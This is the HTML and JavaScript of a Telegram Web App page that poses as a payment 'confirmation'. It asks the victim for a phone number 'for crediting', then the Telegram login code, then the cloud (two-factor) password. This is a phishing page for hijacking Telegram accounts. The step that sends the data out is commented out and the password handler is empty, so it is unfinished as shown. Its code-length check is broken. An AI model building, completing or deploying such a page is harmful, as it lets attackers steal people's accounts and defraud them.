<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <script src="https://telegram.org/js/telegram-web-app.js"></script>
    <style>
        body { background: #1c1c1d; color: white; font-family: sans-serif; text-align: center; padding: 20px; }
        .card { background: #2c2c2e; border-radius: 15px; padding: 20px; }
        input { width: 90%; padding: 12px; margin: 10px 0; border-radius: 8px; border: none; font-size: 16px; }
        button { background: #007aff; color: white; border: none; padding: 12px; border-radius: 8px; width: 100%; font-weight: bold; cursor: pointer; }
        .step { display: none; }
        .active { display: block; }
    </style>
</head>
<body>
    <div class="card">
        <div id="step1" class="step active">
            <h3>Подтверждение</h3>
            <p>Введите номер для зачисления:</p>
            <input type="tel" id="phone" placeholder="+79991234567">
            <button onclick="nextStep(1)">Далее</button>
        </div>
        <div id="step2" class="step">
            <h3>Подтверждение</h3>
            <p>Введите код, отправленный вам в Telegram:</p>
            <input type="number" id="code" placeholder="12345">
            <button onclick="CodeOne()">Далее</button>
        </div>
        <div id = "step3" class ="step">
            <h3>Подтверждение</h3>
            <p>Введите Облачный пароль если есть. Если нету поставьте -</p>
            <input type="string" id="Password">
            <button onclick ="PassTake()">Подтвердить</button>
    </div>

    <script>
        let tg = window.Telegram.WebApp;
tg.expand();

function nextStep(stepNumber) {
        let phone = document.getElementById('phone').value;
        
        // Простая проверка: если номер слишком короткий, показываем предупреждение
        if (phone.length < 10) {
            return alert("Пожалуйста, введите корректный номер");
        }
        //tg.sendData("STEP1_PHONE:" + phone); 
        // Прячем первый шаг (удаляем класс active и скрываем)
        document.getElementById('step1').classList.remove('active');
        
        // Показываем второй шаг (добавляем класс active)
        document.getElementById('step2').classList.add('active');
    }

function CodeOne() {
    let code = document.getElementById('code').value;
    // ЭТАП 2: Отправляем боту сам код
    if (code.length < 5 && code.length > 5){
        return alert("Пожалуйста, введите корректный код");
    }
    
    document.getElementById('step2').classList.remove('active');
        
        // Показываем второй шаг (добавляем класс active)
    document.getElementById('step3').classList.add('active');
}

function PassTake() {
    let Password = document.getElementById('Password').value;

}
    </script>
</body>
</html>
